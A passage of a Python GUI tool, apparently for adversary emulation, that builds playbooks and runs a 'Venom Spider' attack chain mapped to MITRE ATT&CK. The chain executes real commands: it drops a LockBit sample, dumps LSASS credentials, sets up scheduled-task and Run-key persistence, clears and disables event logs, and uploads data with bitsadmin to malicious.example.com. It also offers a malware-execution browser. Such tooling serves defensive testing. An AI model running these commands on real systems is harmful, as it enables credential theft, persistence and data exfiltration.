            entries[field] = ttk.Entry(form_frame, width=80)
            entries[field].grid(row=i, column=1, sticky='ew', pady=5)
        
        shell_frame = ttk.Frame(form_frame)
        shell_frame.grid(row=len(fields), column=1, sticky='w', pady=5)
        ttk.Label(form_frame, text="Shell Type:").grid(row=len(fields), column=0, sticky='ne', pady=5, padx=5)
        
        self.shell_type_var = tk.StringVar(value="powershell")
        ps_radio = ttk.Radiobutton(shell_frame, text="PowerShell", variable=self.shell_type_var, value="powershell", style='Theme.TRadiobutton', cursor='hand2')
        ps_radio.pack(side=tk.LEFT, padx=5)
        cmd_radio = ttk.Radiobutton(shell_frame, text="CMD", variable=self.shell_type_var, value="cmd", style='Theme.TRadiobutton', cursor='hand2')
        cmd_radio.pack(side=tk.LEFT, padx=5)
        
        current_row = len(fields) + 1
        script_pane = tk.PanedWindow(form_frame, orient=tk.HORIZONTAL, bg=theme["frame_bg"], sashwidth=8)
        script_pane.grid(row=current_row, column=0, columnspan=2, sticky='nsew', pady=10)
        form_frame.grid_rowconfigure(current_row, weight=1)
        form_frame.grid_columnconfigure(1, weight=1)

        sim_script_frame = ttk.Frame(script_pane)
        ttk.Label(sim_script_frame, text="Simulation Script").pack(anchor='w')
        sim_script_text = scrolledtext.ScrolledText(sim_script_frame, height=15, bg=theme["terminal_bg"], fg=theme["text_fg"], font=(theme["font_family"], 9))
        sim_script_text.pack(fill=tk.BOTH, expand=True)
        script_pane.add(sim_script_frame, stretch="always")

        clean_script_frame = ttk.Frame(script_pane)
        ttk.Label(clean_script_frame, text="Cleanup Script").pack(anchor='w')
        clean_script_text = scrolledtext.ScrolledText(clean_script_frame, height=15, bg=theme["terminal_bg"], fg=theme["text_fg"], font=(theme["font_family"], 9))
        clean_script_text.pack(fill=tk.BOTH, expand=True)
        script_pane.add(clean_script_frame, stretch="always")
        
        def save_simulation():
            sim_data = {
                "id": entries["ID"].get().strip(),
                "name": entries["Name"].get().strip(),
                "tactic": entries["Tactic"].get().strip(),
                "description": entries["Description"].get().strip(),
                "shell_type": self.shell_type_var.get(),
                "simulation_script": sim_script_text.get("1.0", tk.END).strip(),
                "cleanup_script": clean_script_text.get("1.0", tk.END).strip()
            }
            if not sim_data['id'] or not sim_data['name']:
                messagebox.showerror("Error", "ID and Name cannot be empty.")
                return
            if not sim_data['id'].startswith("CUSTOM-"):
                sim_data['id'] = f"CUSTOM-{sim_data['id']}"

            file_name = f"{sim_data['id']}.json"
            file_path = self.custom_sims_path / file_name
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    json.dump(sim_data, f, indent=2)
                messagebox.showinfo("Success", f"Simulation saved to:\n{file_path}")
                self.all_tests = self.load_all_tests()
                self.show_main_menu()
            except Exception as e:
                messagebox.showerror("Save Failed", f"Could not save simulation file.\n\nError: {e}")

        if sim_id_to_edit:
            sim_to_edit = None
            for tech in self.all_tests.get("Custom Simulations", {}).values():
                if tech.get('data', {}).get('id') == sim_id_to_edit:
                    sim_to_edit = tech['data']
                    break
            if sim_to_edit:
                entries["ID"].insert(0, sim_to_edit.get("id", "").replace("CUSTOM-", ""))
                entries["Name"].insert(0, sim_to_edit.get("name", ""))
                entries["Tactic"].insert(0, sim_to_edit.get("tactic", ""))
                entries["Description"].insert(0, sim_to_edit.get("description", ""))
                self.shell_type_var.set(sim_to_edit.get("shell_type", "powershell"))
                sim_script_text.insert("1.0", sim_to_edit.get("simulation_script", ""))
                clean_script_text.insert("1.0", sim_to_edit.get("cleanup_script", ""))

        button_bar = ttk.Frame(self.main_frame)
        button_bar.pack(fill=tk.X, side=tk.BOTTOM, pady=10)
        save_btn = tk.Button(button_bar, text="💾 Save Simulation", command=save_simulation, bg=theme["button_bg"], fg=theme["accent_fg"], cursor='hand2')
        save_btn.pack(side=tk.RIGHT, padx=20)
        back_btn = tk.Button(button_bar, text="🔙 Back to Main Menu", command=self.show_main_menu, bg=theme["button_bg"], fg=theme["accent_fg"], cursor='hand2')
        back_btn.pack(side=tk.RIGHT, padx=20)

    # --- UNIFIED PLAYBOOK MANAGER MODULE ---

    def show_playbook_manager(self):
        self.current_view_factory = self.show_playbook_manager
        self.clear_frame()
        theme = self.themes[self.current_theme_name]

        ttk.Label(self.main_frame, text="📚 Playbook Manager", style='Title.TLabel').pack(pady=10)
        
        notebook = ttk.Notebook(self.main_frame, style='TNotebook')
        notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        launcher_tab = ttk.Frame(notebook, style='TFrame')
        builder_tab = ttk.Frame(notebook, style='TFrame')
        
        notebook.add(launcher_tab, text="🚀 Launcher")
        notebook.add(builder_tab, text="🏗️ Builder")
        
        self.setup_playbook_launcher_tab(launcher_tab)
        self.setup_playbook_builder_tab(builder_tab)

        back_btn = tk.Button(self.main_frame, text="🔙 Back to Main Menu", command=self.show_main_menu, bg=theme["button_bg"], fg=theme["accent_fg"], activebackground=theme["button_active_bg"], activeforeground=theme["accent_fg"], font=(theme["font_family"], 9, 'bold'), relief='raised', bd=2, cursor='hand2')
        back_btn.pack(side=tk.BOTTOM, anchor='se', padx=10, pady=10)
        
    def setup_playbook_launcher_tab(self, parent_frame):
        theme = self.themes[self.current_theme_name]
        launcher_pane = tk.PanedWindow(parent_frame, orient=tk.HORIZONTAL, bg=theme["frame_bg"], sashwidth=8, sashrelief=tk.RAISED)
        launcher_pane.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        left_pane = ttk.Frame(launcher_pane)
        ttk.Label(left_pane, text="Saved Playbooks").pack(anchor='w')
        playbook_tree = ttk.Treeview(left_pane, columns=("path",), displaycolumns=(), style="Treeview")
        playbook_tree.heading("#0", text="Playbook Name")
        playbook_tree.pack(fill=tk.BOTH, expand=True)
        launcher_pane.add(left_pane, width=300)

        right_pane = ttk.Frame(launcher_pane)
        ttk.Label(right_pane, text="Playbook Details").pack(anchor='w')
        
        steps_text = scrolledtext.ScrolledText(right_pane, height=10, bg=theme["terminal_bg"], fg=theme["text_fg"], font=(theme["font_family"], 9))
        steps_text.pack(fill=tk.BOTH, expand=True)
        steps_text.config(state=tk.DISABLED)
        launcher_pane.add(right_pane)

        button_bar = ttk.Frame(left_pane)
        button_bar.pack(fill=tk.X, pady=5)

        def populate_playbooks():
            for item in playbook_tree.get_children():
                playbook_tree.delete(item)
            if not self.playbooks_path.exists(): return
            
            for file_path in sorted(self.playbooks_path.glob("*.json")):
                try:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        playbook_name = data.get("name", file_path.stem)
                        playbook_tree.insert("", "end", text=playbook_name, values=(str(file_path),))
                except Exception as e:
                    print(f"Failed to load playbook {file_path.name}: {e}")

        def on_playbook_select(event):
            selection = playbook_tree.selection()
            if not selection: 
                run_btn.config(state=tk.DISABLED)
                delete_btn.config(state=tk.DISABLED)
                return

            run_btn.config(state=tk.NORMAL)
            delete_btn.config(state=tk.NORMAL)
            
            file_path_str = playbook_tree.item(selection[0], "values")[0]
            file_path = Path(file_path_str)
            try:
                with open(file_path, 'r', encoding='utf-8') as f: data = json.load(f)
                steps_text.config(state=tk.NORMAL)
                steps_text.delete("1.0", tk.END)
                steps_text.insert(tk.END, f"Name: {data.get('name', 'N/A')}\n")
                steps_text.insert(tk.END, f"Steps: {len(data.get('steps', []))}\n\n")
                for i, step_id in enumerate(data.get("steps", []), 1):
                    step_name = "Unknown Test"
                    for _, techniques in self.all_tests.items():
                        if step_id in techniques:
                            step_name = techniques[step_id]['name']
                            break
                    steps_text.insert(tk.END, f"{i}. {step_id}: {step_name}\n")
                steps_text.config(state=tk.DISABLED)
            except Exception as e:
                steps_text.config(state=tk.NORMAL)
                steps_text.delete("1.0", tk.END)
                steps_text.insert(tk.END, f"Error loading playbook:\n{e}")
                steps_text.config(state=tk.DISABLED)

        def run_selected_playbook():
            selection = playbook_tree.selection()
            if not selection: return
            file_path_str = playbook_tree.item(selection[0], "values")[0]
            try:
                with open(Path(file_path_str), 'r', encoding='utf-8') as f: data = json.load(f)
                playbook_name = data.get('name', 'Untitled Playbook')
                steps = data.get('steps', [])
                if not steps:
                    messagebox.showwarning("Empty Playbook", "This playbook has no steps to run.")
                    return
                self.show_playbook_execution_terminal_view(f"Executing Playbook: {playbook_name}", steps, self.show_playbook_manager)
            except Exception as e:
                messagebox.showerror("Execution Error", f"Failed to read or run playbook:\n{e}")

        def delete_selected_playbook():
            selection = playbook_tree.selection()
            if not selection: return
            playbook_name = playbook_tree.item(selection[0], 'text')
            if not messagebox.askyesno("Confirm Deletion", f"Are you sure you want to delete the playbook '{playbook_name}'?"): return
            try:
                file_path_str = playbook_tree.item(selection[0], "values")[0]
                Path(file_path_str).unlink()
                messagebox.showinfo("Success", f"Playbook '{playbook_name}' deleted.")
                populate_playbooks()
                steps_text.config(state=tk.NORMAL)
                steps_text.delete("1.0", tk.END)
                steps_text.config(state=tk.DISABLED)
            except Exception as e:
                 messagebox.showerror("Deletion Failed", f"Could not delete playbook file:\n{e}")

        playbook_tree.bind("<<TreeviewSelect>>", on_playbook_select)
        
        run_btn = tk.Button(button_bar, text="▶️ Run", command=run_selected_playbook, state=tk.DISABLED, bg=theme["button_bg"], fg=theme["accent_fg"], cursor='hand2')
        run_btn.pack(side=tk.LEFT)
        delete_btn = tk.Button(button_bar, text="🗑️ Delete", command=delete_selected_playbook, state=tk.DISABLED, bg=theme["button_bg"], fg=theme["accent_fg"], cursor='hand2')
        delete_btn.pack(side=tk.LEFT, padx=10)

        populate_playbooks()

    def setup_playbook_builder_tab(self, parent_frame):
        theme = self.themes[self.current_theme_name]
        self.all_tests = self.load_all_tests()
        
        manager_pane = tk.PanedWindow(parent_frame, orient=tk.HORIZONTAL, bg=theme["frame_bg"], sashwidth=8, sashrelief=tk.RAISED)
        manager_pane.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        left_frame = ttk.Frame(manager_pane, style='TFrame')
        ttk.Label(left_frame, text="Available Tests").pack(anchor='w')
        
        tests_tree = ttk.Treeview(left_frame, style="Treeview", selectmode=tk.EXTENDED)
        tests_tree.heading("#0", text="Tactic / Test")
        tests_tree.pack(fill=tk.BOTH, expand=True, pady=(5,0))
        for tactic, techniques in self.all_tests.items():
            tactic_id = tests_tree.insert("", "end", text=tactic, open=True, tags=('tactic',))
            for ttp_id, details in techniques.items():
                tests_tree.insert(tactic_id, "end", text=f"{ttp_id}: {details['name']}", tags=('test',))
        tests_tree.tag_configure('tactic', foreground=theme['title_fg'])
        
        manager_pane.add(left_frame, stretch="always")

        center_frame = ttk.Frame(manager_pane, width=50, style='TFrame')
        add_btn = tk.Button(center_frame, text=">>", command=lambda: self.move_treeview_items(tests_tree, playbook_steps_list), bg=theme["button_bg"], fg=theme["accent_fg"], width=4, cursor='hand2')
        add_btn.pack(pady=10, padx=5)
        rem_btn = tk.Button(center_frame, text="<<", command=lambda: self.remove_listbox_items(playbook_steps_list), bg=theme["button_bg"], fg=theme["accent_fg"], width=4, cursor='hand2')
        rem_btn.pack(pady=10, padx=5)
        manager_pane.add(center_frame, stretch="never")

        right_frame = ttk.Frame(manager_pane, style='TFrame')
        ttk.Label(right_frame, text="Playbook Name:").pack(anchor='w')
        playbook_name_entry = ttk.Entry(right_frame, width=50)
        playbook_name_entry.pack(fill=tk.X)
        ttk.Label(right_frame, text="Playbook Steps:").pack(anchor='w', pady=(10,0))
        playbook_steps_list = tk.Listbox(
            right_frame, bg=theme["terminal_bg"], fg=theme["text_fg"],
            selectbackground=theme["accent_fg"], selectforeground=theme["terminal_bg"],
            borderwidth=0, highlightthickness=0, selectmode=tk.EXTENDED
        )
        playbook_steps_list.pack(fill=tk.BOTH, expand=True)
        manager_pane.add(right_frame, stretch="always")
        
        bottom_bar = ttk.Frame(parent_frame, style='TFrame')
        bottom_bar.pack(side=tk.BOTTOM, fill=tk.X, pady=10, padx=5)

        def create_playbook_button(parent, text, command):
             return tk.Button(parent, text=text, command=command, bg=theme["button_bg"], fg=theme["accent_fg"], activebackground=theme["button_active_bg"], activeforeground=theme["accent_fg"], font=(theme["font_family"], 9, 'bold'), relief='raised', bd=2, cursor='hand2')

        def save_playbook():
            name = playbook_name_entry.get().strip()
            if not name:
                messagebox.showerror("Error", "Playbook Name cannot be empty.")
                return
            steps = [item.split(':')[0].strip() for item in playbook_steps_list.get(0, tk.END)]
            playbook_data = {"name": name, "steps": steps}
            file_path = self.playbooks_path / f"{name.replace(' ', '_')}.json"
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    json.dump(playbook_data, f, indent=2)
                messagebox.showinfo("Success", f"Playbook '{name}' saved.")
                self.show_playbook_manager()
            except Exception as e:
                messagebox.showerror("Save Failed", f"Error: {e}")

        def load_playbook():
            file_path = filedialog.askopenfilename(initialdir=self.playbooks_path, title="Load Playbook", filetypes=[("JSON files", "*.json")])
            if not file_path: return
            try:
                with open(file_path, 'r', encoding='utf-8') as f: playbook_data = json.load(f)
                playbook_name_entry.delete(0, tk.END)
                playbook_name_entry.insert(0, playbook_data['name'])
                playbook_steps_list.delete(0, tk.END)
                for step_id in playbook_data['steps']:
                    step_name = "Unknown Test"
                    for _, techniques in self.all_tests.items():
                        if step_id in techniques:
                            step_name = techniques[step_id]['name']
                            break
                    playbook_steps_list.insert(tk.END, f"{step_id}: {step_name}")
            except Exception as e:
                messagebox.showerror("Load Failed", f"Error: {e}")
        
        def delete_selected_test_from_list():
            selection = tests_tree.selection()
            if not selection:
                messagebox.showwarning("No Selection", "Please select a custom test from the 'Available Tests' list to delete.")
                return
            
            selected_id = selection[0]
            if not tests_tree.parent(selected_id):
                messagebox.showwarning("Invalid Selection", "Please select a test, not a tactic folder.")
                return

            ttp_id = tests_tree.item(selected_id, "text").split(':')[0].strip()
            if self._delete_custom_test(ttp_id):
                self.show_playbook_manager()

        save_btn = create_playbook_button(bottom_bar, text="💾 Save Playbook", command=save_playbook)
        save_btn.pack(side=tk.LEFT, padx=5)
        load_btn = create_playbook_button(bottom_bar, text="📂 Load for Editing", command=load_playbook)
        load_btn.pack(side=tk.LEFT, padx=5)
        delete_test_btn = create_playbook_button(bottom_bar, text="🗑️ Delete Test", command=delete_selected_test_from_list)
        delete_test_btn.pack(side=tk.LEFT, padx=5)

    def move_treeview_items(self, source_tree, dest_lb):
        """Moves selected items from a Treeview to a Listbox."""
        selected_ids = source_tree.selection()
        for iid in selected_ids:
            if source_tree.parent(iid):
                item_text = source_tree.item(iid, "text")
                dest_lb.insert(tk.END, item_text)
    
    def remove_listbox_items(self, listbox):
        """Removes selected items from a listbox."""
        selected_indices = listbox.curselection()
        for i in reversed(selected_indices):
            listbox.delete(i)

    # --- THREAT ACTOR SIMULATION MODULE ---
    
    def show_ta_simulation_menu(self):
        self.current_view_factory = self.show_ta_simulation_menu
        self.clear_frame()
        theme = self.themes[self.current_theme_name]

        ttk.Label(self.main_frame, text="🎭 Threat Actor Simulations", style='Title.TLabel').pack(pady=10)
        
        button_frame = ttk.Frame(self.main_frame)
        button_frame.pack(expand=True)

        def create_ta_button(parent, text, command):
            return tk.Button(parent, text=text, command=command, bg=theme["button_bg"], fg=theme["accent_fg"], activebackground=theme["button_active_bg"], activeforeground=theme["accent_fg"], font=(theme["font_family"], 10, 'bold'), relief='raised', bd=2, width=35, height=2, cursor='hand2')

        venom_btn = create_ta_button(button_frame, "🕷️ Venom Spider Attack", self.show_venom_spider_simulation)
        venom_btn.pack(pady=8)
        
        back_btn = tk.Button(self.main_frame, text="🔙 Back to Main Menu", command=self.show_main_menu, bg=theme["button_bg"], fg=theme["accent_fg"], activebackground=theme["button_active_bg"], activeforeground=theme["accent_fg"], font=(theme["font_family"], 9, 'bold'), relief='raised', bd=2, cursor='hand2')
        back_btn.pack(side=tk.BOTTOM, anchor='se', padx=10, pady=10)

    def show_venom_spider_simulation(self):
        self.current_view_factory = self.show_venom_spider_simulation
        self.clear_frame()
        self.ttp_terminal = None
        theme = self.themes[self.current_theme_name]
        title = ttk.Label(self.main_frame, text="🕷️ VENOM SPIDER ATTACK SIMULATION", style='Title.TLabel')
        title.pack(pady=(10, 20), fill=tk.X)
        notebook = ttk.Notebook(self.main_frame, style='TNotebook')
        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        sim_frame = ttk.Frame(notebook, style='TFrame')
        notebook.add(sim_frame, text="🎯 Simulation")
        mitre_frame = ttk.Frame(notebook, style='TFrame')
        notebook.add(mitre_frame, text="📊 MITRE ATT&CK TTPs")
        self.setup_simulation_tab(sim_frame)
        self.setup_mitre_tab(mitre_frame)
        if self._terminal_content_backup:
            if hasattr(self, 'terminal_output') and self.terminal_output.winfo_exists():
                self.terminal_output.insert("1.0", self._terminal_content_backup)
                self.terminal_output.see(tk.END)
            self._terminal_content_backup = ""
        back_btn = tk.Button(self.main_frame, text="🔙 Back to TA Simulations", command=self.show_ta_simulation_menu, bg=theme["button_bg"], fg=theme["accent_fg"], activebackground=theme["button_active_bg"], activeforeground=theme["accent_fg"], font=(theme["font_family"], 9, 'bold'), relief='raised', bd=2, cursor='hand2')
        back_btn.pack(side=tk.BOTTOM, anchor='se', padx=10, pady=10)
        self.create_theme_selector(self.main_frame)
    
    def setup_simulation_tab(self, parent):
        theme = self.themes[self.current_theme_name]
        control_frame = ttk.Frame(parent, style='TFrame')
        control_frame.pack(fill=tk.X, padx=10, pady=10)
        def create_control_button(text, command):
            return tk.Button(control_frame, text=text, command=command, bg=theme["button_bg"], fg=theme["accent_fg"], activebackground=theme["button_active_bg"], activeforeground=theme["accent_fg"], font=(theme["font_family"], 9, 'bold'), relief='raised', bd=2, cursor='hand2')
        simulate_btn = create_control_button("⚡ Execute Venom Spider Attack Chain", self.execute_venom_spider_attack)
        simulate_btn.pack(side=tk.LEFT, padx=5)
        research_btn = create_control_button("📖 Arctic Wolf Labs Report", self.open_research_link)
        research_btn.pack(side=tk.LEFT, padx=5)
        clear_btn = create_control_button("🧹 Clear Terminal", self.clear_terminal)
        clear_btn.pack(side=tk.LEFT, padx=5)
        terminal_frame = ttk.Frame(parent, style='TFrame')
        terminal_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        terminal_label = ttk.Label(terminal_frame, text="💻 Command Execution Terminal (Real-time Output)", style='Title.TLabel')
        terminal_label.pack(anchor=tk.W, pady=(0, 5))
        self.terminal_output = scrolledtext.ScrolledText(terminal_frame, bg=theme["terminal_bg"], fg=theme["accent_fg"], relief=tk.FLAT, font=(theme["font_family"], 9), height=25, wrap=tk.WORD, insertbackground=theme["title_fg"])
        self.terminal_output.pack(fill=tk.BOTH, expand=True)
        
    def setup_mitre_tab(self, parent):
        theme = self.themes[self.current_theme_name]
        mitre_title = ttk.Label(parent, text="📊 VENOM SPIDER - MITRE ATT&CK TECHNIQUES", style='Title.TLabel')
        mitre_title.pack(pady=10)
        mitre_text_widget = scrolledtext.ScrolledText(parent, bg=theme["terminal_bg"], fg=theme["accent_fg"], relief=tk.FLAT, font=(theme["font_family"], 9), height=30, wrap=tk.WORD, insertbackground=theme["title_fg"])
        mitre_text_widget.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        mitre_info = r"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                   VENOM SPIDER ATTACK TECHNIQUES                                  ║
║                                     MITRE ATT&CK Framework                                     ║
╚══════════════════════════════════════════════════════════════════════════════╝

OBFUSCATION / EVASION
├─ T1027 - Obfuscated Files or Information
│  └─ Description: Copying a payload named 'kaboom.exe' to %TEMP%.
│  └─ Simulation: `copy "Z:\...\payload.exe" "%TEMP%\kaboom.exe"`

PRIVILEGE ESCALATION
├─ T1548.002 - UAC Bypass via mshta.exe (Abuse Elevation Control Mechanism)
│  └─ Description: Simulating UAC bypass using mshta.exe with a remote HTA file.
│  └─ Simulation: Logs attempt and writes a mock event log entry.

CREDENTIAL ACCESS
├─ T1003 - OS Credential Dumping: LSASS Memory
│  └─ Description: Dumping LSASS process memory to obtain credentials.
│  └─ Simulation: `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> %TEMP%\lsass_venom.dmp full`

PERSISTENCE
├─ T1053.005 - Scheduled Task/Job: Scheduled Task
│  └─ Description: Creating a scheduled task to run payload on logon.
│  └─ Simulation: `schtasks /create /tn "VenomUpdater" /tr "%TEMP%\kaboom.exe" /sc onlogon /ru SYSTEM /f`
│
├─ T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
│  └─ Description: Adding a registry Run key to execute payload on startup.
│  └─ Simulation: `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "VenomUpdater" /t REG_SZ /d "%TEMP%\kaboom.exe" /f`

COLLECTION
├─ T1074.001 - Data Staged: Local Data Staging
│  └─ Description: Copying sensitive data to a temporary staging location.
│  └─ Simulation: `copy "%USERPROFILE%\Documents\sensitivedata.txt" "%TEMP%\sensitivedata_staged.txt"`

DEFENSE EVASION
├─ T1562.001 - Impair Defenses: Disable or Modify Tools (Event Logging)
│  └─ Description: Clearing and disabling Application and System event logs.
│  └─ Simulation: `wevtutil cl Application`, `wevtutil cl System`, `wevtutil sl Application /e:false`, `wevtutil sl System /e:false`

EXFILTRATION
├─ T1041 - Exfiltration Over C2 Channel
│  └─ Description: Using bitsadmin to upload staged data to a mock C2 server.
│  └─ Simulation: `bitsadmin /transfer "VenomExfilJob" /upload /priority HIGH "%TEMP%\sensitivedata_staged.txt" "http://malicious.example.com/exfil/data.zip"`
"""
        mitre_text_widget.insert(tk.END, mitre_info)
        mitre_text_widget.config(state=tk.DISABLED)

    def open_research_link(self):
        url = "https://arcticwolf.com/resources/blog/venom-spider-uses-server-side-polymorphism-to-weave-a-web-around-victims/"
        webbrowser.open(url)
        self.log_to_terminal(f"🔗 Opened Arctic Wolf Labs report on Venom Spider: {url}")

    def execute_venom_spider_attack(self):
        if self.simulation_running:
            self.log_to_terminal("=> A simulation is already in progress. Please wait for it to complete.")
            return
        
        if not (hasattr(self, 'terminal_output') and self.terminal_output.winfo_exists()):
            messagebox.showwarning("No Terminal", "Cannot start simulation without a visible terminal.")
            return

        self.simulation_running = True
        self.clear_terminal()
        self.log_to_terminal("🕷️ INITIATING VENOM SPIDER ATTACK SIMULATION...")
        self.log_to_terminal("="*60)
        self.log_to_terminal("⚠️ WARNING: This will execute commands that mimic malware behavior.")
        self.log_to_terminal("="*60)

        payload_source_path = r"Z:\Malware Samples\TA Samples\Lockbit\48e2033a286775c3419bea8702a717de0b2aaf1e737ef0e6b3bf31ef6ae00eb5.exe"
        payload_dest_path = os.path.join(os.environ.get("TEMP", "C:\\Temp"), "kaboom.exe")
        sensitive_data_source = os.path.join(os.path.expanduser("~"), "Documents", "sensitivedata.txt")
        sensitive_data_staged = os.path.join(os.environ.get("TEMP", "C:\\Temp"), "sensitivedata_staged.txt")
        lsass_dump_path = os.path.join(os.environ.get("TEMP", "C:\\Temp"), "lsass_venom.dmp")

        if not Path(sensitive_data_source).exists():
            self.log_to_terminal(f"⚠️ PREREQUISITE MISSING: '{sensitive_data_source}'. Data staging will be skipped.")
        if not Path(payload_source_path).exists():
            self.log_to_terminal(f"⚠️ PREREQUISITE MISSING: Payload at '{payload_source_path}'. Payload-dependent steps will be affected.")

        attack_commands = [
            ("T1027 - Payload Copy", f'if exist "{payload_source_path}" (copy "{payload_source_path}" "{payload_dest_path}") else (echo Payload source not found > nul)'),
            ("T1548.002 - UAC Bypass (Simulated)", "powershell -Command \"Write-Host '[SIMULATED] Attempting UAC bypass via mshta.exe with http://malicious.example.com/evil.hta'; Add-Type -AssemblyName System.Core; try { $eventLog = New-Object System.Diagnostics.EventLog('Application'); $eventLog.Source = 'VenomSpiderSim'; $eventLog.WriteEntry('Simulated mshta.exe UAC bypass to http://malicious.example.com/evil.hta', 'Warning', 3800) } catch {}\""),
            ("T1003 - LSASS Dump", f'powershell -Command "$lsass = Get-Process lsass -ErrorAction SilentlyContinue; if ($lsass) {{ rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsass.Id {lsass_dump_path} full }} else {{ Write-Host \\"LSASS process not found.\\" }}"'),
            ("T1053 - Persistence (Scheduled Task)", f'schtasks /create /tn "VenomUpdater" /tr "{payload_dest_path}" /sc onlogon /ru SYSTEM /f /RL HIGHEST'),
            ("T1547 - Persistence (Registry Run Key)", f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "VenomUpdater" /t REG_SZ /d "{payload_dest_path}" /f'),
            ("T1074 - Data Staging", f'if exist "{sensitive_data_source}" (copy "{sensitive_data_source}" "{sensitive_data_staged}") else (echo Source sensitive data not found > nul)'),
            ("T1562 - Defense Evasion (Disable Event Logs - Simulated)", "powershell -Command \"Write-Host '[SIMULATED] Clearing and disabling Application/System event logs.'; wevtutil cl Application > $null; wevtutil cl System > $null; wevtutil sl Application /e:false > $null; wevtutil sl System /e:false > $null\""),
            ("T1041 - Exfiltration (bitsadmin)", f'if exist "{sensitive_data_staged}" (bitsadmin /transfer "VenomExfilJob" /upload /priority HIGH "{sensitive_data_staged}" "http://malicious.example.com/exfil/data.zip") else (echo Staged data not found for exfil > nul)')
        ]
        
        threading.Thread(target=self._execute_commands_thread, args=(attack_commands, payload_dest_path, sensitive_data_staged, lsass_dump_path), daemon=True).start()
        
    def _execute_commands_thread(self, attack_commands, payload_dest_path, sensitive_data_staged, lsass_dump_path):
        try:
            for i, (technique, command) in enumerate(attack_commands, 1):
                if self.stop_operations:
                    self.log_to_terminal("🛑 Operation cancelled by user.")
                    return
                
                self.log_to_terminal(f"\n[STAGE {i}] Executing: {technique}")
                self.log_to_terminal(f"💻 > {command}")
                
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
                    if self.stop_operations: return
                    
                    output = result.stdout.strip() if result.stdout else ""
                    error_output = result.stderr.strip() if result.stderr else ""

                    if output: self.log_to_terminal(output)
                    if error_output and "The parameter is incorrect" not in error_output:
                            self.log_to_terminal(f"⚠️ {error_output}")
                    if not output and not error_output and result.returncode == 0:
                        self.log_to_terminal(f"[*] Command executed successfully (No specific output).")

                except subprocess.TimeoutExpired:
                    self.log_to_terminal("⏱️ Command timed out.")
                except Exception as e:
                    self.log_to_terminal(f"❌ Failed to execute command: {e}")
                
                self.log_to_terminal("-" * 50)
                time.sleep(1)

            if self.stop_operations: return 
            
            self.log_to_terminal("\n\n🧹 INITIATING CLEANUP PHASE...")
            self.log_to_terminal("="*60)

            cleanup_commands = [
                ("Delete Scheduled Task 'VenomUpdater'", 'schtasks /delete /tn "VenomUpdater" /f'),
                ("Delete Registry Run Key 'VenomUpdater'", 'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "VenomUpdater" /f'),
                ("Delete Staged Data", f'if exist "{sensitive_data_staged}" del "{sensitive_data_staged}" /f /q'),
                ("Delete Dropped Payload", f'if exist "{payload_dest_path}" del "{payload_dest_path}" /f /q'),
                ("Delete LSASS Dump", f'if exist "{lsass_dump_path}" del "{lsass_dump_path}" /f /q'),
                ("Re-enable Application Event Log (Simulated)", "powershell -Command \"wevtutil sl Application /e:true > $null\""),
                ("Re-enable System Event Log (Simulated)", "powershell -Command \"wevtutil sl System /e:true > $null\"")
            ]

            for name, command in cleanup_commands:
                if self.stop_operations:
                    self.log_to_terminal("🛑 Cleanup cancelled by user.")
                    return
                
                self.log_to_terminal(f"[*] Cleaning up: {name}...")
                try:
                    subprocess.run(command, shell=True, capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
                except Exception as e:
                    self.log_to_terminal(f"⚠️ Could not perform cleanup step '{name}': {e}")
                time.sleep(0.5)
            
            self.log_to_terminal("\n\n✅ ===============================")
            self.log_to_terminal("✅     SIMULATION COMPLETE")
            self.log_to_terminal("✅ ===============================")

        finally:
            self.simulation_running = False

    def show_malware_browser(self):
        self.current_view_factory = self.show_malware_browser
        self.clear_frame()
        theme = self.themes[self.current_theme_name]
        
        content_frame = ttk.Frame(self.main_frame, style='TFrame')
        content_frame.pack(fill=tk.BOTH, expand=True)

        title = ttk.Label(content_frame, text="💀 MALWARE BROWSER", style='Title.TLabel')
        title.pack(pady=(10, 20))
        
        warning = ttk.Label(content_frame, text="⚠️ DANGER: This interface allows execution of malware samples ⚠️", style='Subtitle.TLabel')
        warning.pack(pady=(0, 20))
        
        control_frame = ttk.Frame(content_frame, style='TFrame')
        control_frame.pack(fill=tk.X, padx=10, pady=10)

        def create_malware_button(parent, text, command):
                return tk.Button(parent, text=text, command=command, bg=theme["button_bg"], fg=theme["accent_fg"], activebackground=theme["button_active_bg"], activeforeground=theme["accent_fg"], font=(theme["font_family"], 9, 'bold'), relief='raised', bd=2, cursor='hand2')

        refresh_btn = create_malware_button(control_frame, "🔄 Refresh File List", self.refresh_malware_list)
        refresh_btn.pack(side=tk.LEFT, padx=5)
        browse_btn = create_malware_button(control_frame, "📁 Browse for File", self.browse_for_malware)
        browse_btn.pack(side=tk.LEFT, padx=5)
        execute_btn = create_malware_button(control_frame, "💥 EXECUTE SELECTED FILE", self.execute_selected_file)
        execute_btn.pack(side=tk.LEFT, padx=15)

        list_frame = ttk.Frame(content_frame, style='TFrame')
        list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        list_label = ttk.Label(list_frame, text="📂 Discovered Files (Default: Z:\\...\\Lockbit)", style='Title.TLabel')
        list_label.pack(anchor=tk.W, pady=(0, 5))
        
        listbox_frame = ttk.Frame(list_frame, style='TFrame')
        listbox_frame.pack(fill=tk.BOTH, expand=True)
        
        self.file_listbox = tk.Listbox(listbox_frame, bg=theme["terminal_bg"], fg=theme["accent_fg"], relief=tk.FLAT, font=(theme["font_family"], 10), selectbackground=theme["button_active_bg"], selectforeground=theme["title_fg"], height=15)
